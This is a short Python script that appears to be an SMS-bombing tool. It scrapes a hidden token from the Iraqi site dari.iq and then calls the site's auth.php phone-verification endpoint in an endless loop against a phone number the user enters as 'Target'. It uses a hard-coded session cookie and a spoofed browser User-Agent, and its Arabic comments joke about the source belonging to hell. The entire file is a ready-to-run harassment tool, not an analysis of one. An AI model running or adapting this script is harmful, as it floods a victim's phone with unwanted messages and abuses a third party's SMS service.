import requests,re
r = requests.session()
def fucker(num):
    req = r.get("https://dari.iq/view/").text
    tok = re.findall('<input type="hidden" class="input" value="(.*?)" id="phtoken" />',req)[0]

#لاتسوي رحوك مطور رجا
    cookies = {
         'PHPSESSID' :  'klpiib8c14i02c1eh3o964v6m0' ,
    }
#السورس تابع لجهنم 🙈
    headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://dari.iq/view/',
        'Connection': 'keep-alive',
        # Requests sorts cookies= alphabetically
        # 'Cookie': '_ga_F0PBVP8527=GS1.1.1665220299.1.1.1665220303.0.0.0; _ga=GA1.1.1402629471.1665220300; PHPSESSID=klpiib8c14i02c1eh3o964v6m0',
        'TE': 'Trailers',
    }

    params = {
        'num': f'{num}',
        'phtoken': f'{tok}',
    }

    response = r.get('https://dari.iq/php/auth.php', params=params, cookies=cookies, headers=headers)
    if "true" in str(response.text):
        print(f"[+] SMS SENT SUCCESSFULLY .")
    else:
        p = 0
nu = input("[?] Enter Target: ")
while True:
    fucker(nu)